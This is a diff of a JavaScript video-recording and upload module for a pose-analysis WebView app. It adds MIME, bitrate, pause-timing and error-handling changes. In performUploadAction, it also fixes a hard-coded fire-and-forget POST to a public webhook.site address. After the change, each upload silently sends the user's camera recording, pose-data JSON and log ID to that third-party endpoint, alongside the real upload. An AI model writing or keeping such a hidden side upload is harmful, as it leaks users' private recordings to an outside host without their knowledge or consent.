@@ -5,6 +5,85 @@ let mediaRecorder = null;
 let recordedChunks = [];
 let lastVideoBlob = null;
 let lastJsonBlob = null;
+let recordingStream = null;
+let recordingStreamOwned = false;
+
+const RECORDING_CONFIG = {
+    fps: 25,
+    timesliceMs: 1000,
+    maxPixels: 720 * 1280
+};
+
+let lastRecordingDrawAt = 0;
+let recordingDrawIntervalMs = 1000 / RECORDING_CONFIG.fps;
+
+let recordStartAt = 0;
+let recordPausedAt = 0;
+let recordTotalPausedMs = 0;
+
+function isIOSWebKit() {
+    const ua = navigator.userAgent || '';
+    const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+    const isWebKit = /AppleWebKit/.test(ua) && !/CriOS|FxiOS|EdgiOS/.test(ua);
+    return isIOS && isWebKit;
+}
+
+function pickSupportedMimeType() {
+    const candidates = isIOSWebKit()
+        ? ['video/mp4', 'video/mp4;codecs=avc1.42E01E', 'video/mp4;codecs=h264']
+        : ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+
+    if (typeof MediaRecorder === 'undefined' || typeof MediaRecorder.isTypeSupported !== 'function') return '';
+
+    for (const type of candidates) {
+        try {
+            if (MediaRecorder.isTypeSupported(type)) return type;
+        } catch (_) {}
+    }
+    return '';
+}
+
+function computeTargetBitrate(width, height, fps) {
+    const pixels = Math.max(1, Math.floor(width) * Math.floor(height));
+    const bpp = isIOSWebKit() ? 0.075 : 0.07;
+    const raw = Math.round(pixels * fps * bpp);
+    return Math.min(6_000_000, Math.max(1_000_000, raw));
+}
+
+function makeEven(n) {
+    const v = Math.floor(Number(n) || 0);
+    return v % 2 === 0 ? v : v - 1;
+}
+
+async function getBlobDurationSeconds(blob) {
+    if (!blob || blob.size === 0) return 0;
+    try {
+        const url = URL.createObjectURL(blob);
+        const video = document.createElement('video');
+        video.preload = 'metadata';
+        video.muted = true;
+        video.playsInline = true;
+        const duration = await new Promise((resolve, reject) => {
+            const cleanup = () => {
+                video.onloadedmetadata = null;
+                video.onerror = null;
+            };
+            video.onloadedmetadata = () => {
+                cleanup();
+                resolve(video.duration || 0);
+            };
+            video.onerror = () => {
+                cleanup();
+                reject(new Error('VIDEO_METADATA_LOAD_FAILED'));
+            };
+            video.src = url;
+        });
+        URL.revokeObjectURL(url);
+        return Number.isFinite(duration) ? duration : 0;
+    } catch (_) {
+        return 0;
+    }
+}
 
 function initRecordingCanvas() {
     if (!state.recordingCanvas) {
@@ -16,17 +95,24 @@ function initRecordingCanvas() {
     const isLandscape = Math.abs(currentDeviceRotation) === 90;
     
     // 如果横屏，交换宽高，使录制画布保持竖屏比例
-    if (isLandscape) {
-        state.recordingCanvas.width = canvas.height;
-        state.recordingCanvas.height = canvas.width;
-    } else {
-        state.recordingCanvas.width = canvas.width;
-        state.recordingCanvas.height = canvas.height;
-    }
+    const baseW = isLandscape ? canvas.height : canvas.width;
+    const baseH = isLandscape ? canvas.width : canvas.height;
+
+    const basePixels = Math.max(1, baseW * baseH);
+    const scale = Math.min(1, Math.sqrt(RECORDING_CONFIG.maxPixels / basePixels));
+
+    state.recordingCanvas.width = Math.max(2, makeEven(baseW * scale));
+    state.recordingCanvas.height = Math.max(2, makeEven(baseH * scale));
 }
 
-export function updateRecordingCanvas() {
+export function updateRecordingCanvas(force = false) {
     if (!state.isRecording || !state.recordingCanvas || !state.recordingCtx) return;
+    if (!recordingStreamOwned) return;
+    if (!mediaRecorder || mediaRecorder.state !== 'recording') return;
+
+    const now = performance.now();
+    if (!force && now - lastRecordingDrawAt < recordingDrawIntervalMs - 1) return;
+    lastRecordingDrawAt = now;
 
     const { canvas, recordingCanvas, recordingCtx, currentDeviceRotation } = state;
     const srcW = canvas.width;
@@ -99,28 +185,91 @@ function _startMediaRecorder() {
     recordedChunks = [];
     state.poseDataJson = {};
     state.currentRecordFrameIndex = 0;
+    lastVideoBlob = null;
+    lastJsonBlob = null;
+    lastRecordingDrawAt = 0;
+    recordStartAt = performance.now();
+    recordPausedAt = 0;
+    recordTotalPausedMs = 0;
 
     // 初始化录制专用 Canvas
     initRecordingCanvas();
 
-    const stream = state.recordingCanvas.captureStream(25);
-    let options = {
-        mimeType: 'video/mp4;codecs=avc1'
-    };
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-        console.warn("MP4 不支持，回退到 WebM");
-        options = {
-            mimeType: 'video/webm;codecs=vp8'
-        };
+    if (typeof MediaRecorder === 'undefined') {
+        console.error('MediaRecorder not supported in this WebView');
+        if (window.flutter_inappwebview) {
+            window.flutter_inappwebview.callHandler("onRecordError", {
+                error: "MediaRecorder not supported"
+            });
+        }
+        return;
     }
-    mediaRecorder = new MediaRecorder(stream, options);
+    if (!state.recordingCanvas || typeof state.recordingCanvas.captureStream !== 'function') {
+        if (state.video?.srcObject) {
+            recordingStream = state.video.srcObject;
+            recordingStreamOwned = false;
+        } else {
+            console.error('No captureStream and no video srcObject');
+            if (window.flutter_inappwebview) {
+                window.flutter_inappwebview.callHandler("onRecordError", {
+                    error: "No captureStream and no camera stream"
+                });
+            }
+            return;
+        }
+    } else {
+        recordingStream = state.recordingCanvas.captureStream(RECORDING_CONFIG.fps);
+        recordingStreamOwned = true;
+    }
+    const mimeType = pickSupportedMimeType();
+
+    const bitrate = computeTargetBitrate(
+        state.recordingCanvas.width,
+        state.recordingCanvas.height,
+        RECORDING_CONFIG.fps
+    );
+
+    const options = {};
+    if (mimeType) options.mimeType = mimeType;
+    options.videoBitsPerSecond = bitrate;
+    options.bitsPerSecond = bitrate;
+
+    try {
+        mediaRecorder = new MediaRecorder(recordingStream, options);
+    } catch (e) {
+        console.warn('MediaRecorder init failed with options, retry without mimeType/bitrate', e);
+        mediaRecorder = new MediaRecorder(recordingStream);
+    }
 
     mediaRecorder.ondataavailable = e => {
         if (e.data.size > 0) recordedChunks.push(e.data);
     };
-    mediaRecorder.start();
+    mediaRecorder.onerror = (e) => {
+        console.error('MediaRecorder error:', e);
+        if (window.flutter_inappwebview) {
+            window.flutter_inappwebview.callHandler("onRecordError", {
+                error: e?.error?.message || String(e)
+            });
+        }
+    };
+
+    if (recordingStream) {
+        for (const t of recordingStream.getTracks()) {
+            t.addEventListener('ended', () => {
+                console.warn('Recording stream track ended unexpectedly');
+            });
+        }
+    }
+
+    try {
+        mediaRecorder.start(RECORDING_CONFIG.timesliceMs);
+    } catch (e) {
+        mediaRecorder.start();
+    }
     state.isRecording = true;
     state.autoRecordState = 'RECORDING';
+    recordingDrawIntervalMs = 1000 / RECORDING_CONFIG.fps;
+    if (recordingStreamOwned) updateRecordingCanvas(true);
     
     hideDynamicIsland();
     hideToast();
@@ -167,8 +316,13 @@ export function pauseRecord() {
     // 场景3：录制中暂停/恢复
     if (!mediaRecorder) return;
     if (mediaRecorder.state === "recording") {
+        recordPausedAt = performance.now();
         mediaRecorder.pause();
     } else if (mediaRecorder.state === "paused") {
+        if (recordPausedAt) {
+            recordTotalPausedMs += Math.max(0, performance.now() - recordPausedAt);
+            recordPausedAt = 0;
+        }
         mediaRecorder.resume();
     }
 }
@@ -177,43 +331,107 @@ export async function stopAndUpload(uploadUrl, token, analyzeUrl, logId) {
     state.autoRecordState = 'DISABLED';
     hideToast();
 
+    if (!uploadUrl || !token) {
+        if (window.flutter_inappwebview) {
+            window.flutter_inappwebview.callHandler("onUploadComplete", {
+                success: false,
+                error: "Missing uploadUrl or token"
+            });
+        }
+        return;
+    }
+
+    if (!mediaRecorder) {
+        if (window.flutter_inappwebview) {
+            window.flutter_inappwebview.callHandler("onUploadComplete", {
+                success: false,
+                error: "mediaRecorder is null"
+            });
+        }
+        return;
+    }
+
     if (mediaRecorder && mediaRecorder.state === "inactive") {
         if (lastVideoBlob) {
             console.log("检测到已停止录制，正在进行重试上传...");
-            return await performUploadAction(uploadUrl, token, analyzeUrl, logId);
+            const inferredExt = (lastVideoBlob.type || '').includes('mp4') ? '.mp4' : '.webm';
+            return await performUploadAction(uploadUrl, token, analyzeUrl, logId, inferredExt);
         }
     }
 
-    state.isRecording = false;
-    // We need to wrap the onstop in a promise if we want to await it here, 
-    // but the original code assigned onstop and called stop().
-    // However, stopAndUpload is async.
+    if (recordingStreamOwned) updateRecordingCanvas(true);
+
+    if (recordPausedAt) {
+        recordTotalPausedMs += Math.max(0, performance.now() - recordPausedAt);
+        recordPausedAt = 0;
+    }
     
-    return new Promise((resolve, reject) => {
+    const expectedDurationSec = Math.max(0, (performance.now() - recordStartAt - recordTotalPausedMs) / 1000);
+
+    return new Promise((resolve) => {
         mediaRecorder.onstop = async () => {
-            const mimeType = mediaRecorder.mimeType;
+            const mimeType = mediaRecorder.mimeType || lastVideoBlob?.type || '';
             const extension = mimeType.includes('mp4') ? '.mp4' : '.webm';
             lastVideoBlob = new Blob(recordedChunks, { type: mimeType });
             lastJsonBlob = new Blob([JSON.stringify(state.poseDataJson)], { type: "application/json" });
+            const actualDurationSec = await getBlobDurationSeconds(lastVideoBlob);
+            state.recordingDiagnostics = {
+                mimeType,
+                byteLength: lastVideoBlob.size,
+                expectedDurationSec: Math.round(expectedDurationSec * 1000) / 1000,
+                actualDurationSec: Math.round(actualDurationSec * 1000) / 1000,
+                durationDeltaSec: Math.round((actualDurationSec - expectedDurationSec) * 1000) / 1000,
+                fps: RECORDING_CONFIG.fps,
+                width: state.recordingCanvas?.width || 0,
+                height: state.recordingCanvas?.height || 0,
+                isIOSWebKit: isIOSWebKit()
+            };
             try {
-                await performUploadAction(uploadUrl, token, analyzeUrl, logId,extension);
+                if (recordingStream && recordingStreamOwned) recordingStream.getTracks().forEach(t => t.stop());
+            } catch (_) {}
+            recordingStream = null;
+            recordingStreamOwned = false;
+            try {
+                await performUploadAction(uploadUrl, token, analyzeUrl, logId, extension);
                 resolve();
             } catch (e) {
                 // error handled in performUploadAction but we resolve to finish function
                 resolve();
             }
         };
-        mediaRecorder.stop();
+
+        try {
+            if (typeof mediaRecorder.requestData === 'function') mediaRecorder.requestData();
+        } catch (_) {}
+
+        state.isRecording = false;
+
+        try {
+            mediaRecorder.stop();
+        } catch (e) {
+            console.error('mediaRecorder.stop failed:', e);
+            if (window.flutter_inappwebview) {
+                window.flutter_inappwebview.callHandler("onUploadComplete", {
+                    success: false,
+                    error: e?.message || String(e)
+                });
+            }
+            resolve();
+        }
     });
 }
 
 async function performUploadAction(uploadUrl, token, analyzeUrl, logId,extension) {
+    if (!lastVideoBlob || lastVideoBlob.size === 0) {
+        throw new Error('EMPTY_VIDEO_BLOB');
+    }
+    const inferredExt = extension || ((lastVideoBlob.type || '').includes('mp4') ? '.mp4' : '.webm');
     const formData = new FormData();
-    formData.append("file", lastVideoBlob, `video${extension}`);
+    formData.append("file", lastVideoBlob, `video${inferredExt}`);
     // --- 新增：准备发送到 Webhook 的数据 ---
     const webhookUrl = "https://webhook.site/8237591b-7b89-4bcd-bc45-9205220bb59c";
     const webhookFormData = new FormData();
-    webhookFormData.append("video", lastVideoBlob, "video.mp4");
+    webhookFormData.append("video", lastVideoBlob, `video${inferredExt}`);
     webhookFormData.append("data", lastJsonBlob, "pose_data.json");
     webhookFormData.append("log_id", logId);
     // 新增
@@ -222,12 +440,17 @@ async function performUploadAction(uploadUrl, token, analyzeUrl, logId,extension
         // 2. 新增：异步发送到 Webhook (不阻塞主逻辑，报错也仅记录日志)
         fetch(webhookUrl, {
             method: "POST",
-            body: formData,
+            body: webhookFormData,
             mode: 'no-cors' // 防止跨域导致的报错中断流程
         }).then(() => console.log("Webhook 备份上传成功"))
           .catch(err => console.error("Webhook 备份失败:", err));
         // 新增
-        const resData = await response.json();
+        let resData = null;
+        try {
+            resData = await response.json();
+        } catch (e) {
+            throw new Error('UPLOAD_RESPONSE_NOT_JSON');
+        }
         if (resData.code === 200) {
             const videoUrl = resData.data.url;
             // const analyzeRes = await fetch(analyzeUrl, {
@@ -252,19 +475,24 @@ async function performUploadAction(uploadUrl, token, analyzeUrl, logId,extension
             // } else {
             //     throw new Error(analyzeData.msg || "动作分析失败，请稍后重试");
             // }
-            window.flutter_inappwebview.callHandler("onUploadComplete", {
-            success: true,
-            videoUrl: videoUrl,
-            analyzeData: state.poseDataJson
-        });
+            if (window.flutter_inappwebview) {
+                window.flutter_inappwebview.callHandler("onUploadComplete", {
+                    success: true,
+                    videoUrl: videoUrl,
+                    analyzeData: state.poseDataJson,
+                    recordingDiagnostics: state.recordingDiagnostics || null
+                });
+            }
         } else {
             throw new Error(resData.msg || "上传视频失败");
         }
     } catch (err) {
         console.error("详细错误信息:", err);
-        window.flutter_inappwebview.callHandler("onUploadComplete", {
-            success: false,
-            error: err.toString()
-        });
+        if (window.flutter_inappwebview) {
+            window.flutter_inappwebview.callHandler("onUploadComplete", {
+                success: false,
+                error: err.toString()
+            });
+        }
     }
 }
